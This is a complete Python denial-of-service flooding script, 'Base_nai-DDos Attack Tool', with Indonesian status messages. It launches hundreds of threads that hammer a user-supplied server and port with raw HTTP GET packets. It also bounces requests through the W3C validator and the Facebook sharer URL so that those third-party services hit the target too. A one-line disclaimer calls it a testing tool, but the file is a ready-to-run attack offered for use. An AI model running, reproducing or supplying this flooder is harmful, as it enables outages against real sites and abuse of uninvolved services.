7#!/usr/bin/python3
# -*- coding: utf-8 -*-


import logging
import random
import socket
import sys
import threading
import time
import urllib.request
from optparse import OptionParser
from queue import Queue


def user_agent():
    global useragent
    useragent = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                 "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
                 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
                 "3.5.30729)",
                 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 "
                 "Chrome/16.0.912.63 Safari/535.7",
                 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR "
                 "3.5.30729)",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"]
    return useragent


def my_bots():
    global bots
    bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]
    return bots


def bot_Base_nai(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
            print("\033[94mbot is Base_nai...\033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    try:
        while True:
            packet = str(
                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(useragent) + "\n" + data).encode(
                'utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! Base_nai--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno koneksi! server sedang down\033[0m")
        # print("\033[91m",e,"\033[0m")
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_Base_nai(random.choice(bots) + "http://" + host)
        w.task_done()


def usage():
    print(''' \033[92m	Base_nai-DDos Attack Tool v1.0
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your ip is visible. \n
    usage : python Base_nai.py [-s] [-p] [-t]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 200 \033[0m''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 200
    else:
        thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
# task queue are q,w
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
    print("\033[94mMohon tunggu sistem bekerja...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcek server ip dan port\033[0m")
        usage()
    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if (item > 1800):  # for no memory crash
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
